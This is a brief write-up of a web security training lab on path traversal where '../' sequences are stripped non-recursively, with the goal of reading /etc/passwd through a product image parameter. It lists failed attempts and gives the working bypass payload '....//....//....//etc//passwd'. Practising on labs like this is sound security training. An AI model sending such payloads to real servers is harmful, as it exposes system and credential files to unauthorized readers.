# Lab 03 : File path traversal, traversal sequences stripped non-recursively

## Overview:
- Level : PRACTITIONER
- path traversal vulnerability in the display of product images
- End goal: retrieve the contents of the /etc/passwd file.

## Solution:
- ../../../etc/passwd doesn't work
- use absolute path
    /etc/passwd 
    doesn't work
- ....//....//....//etc//passwd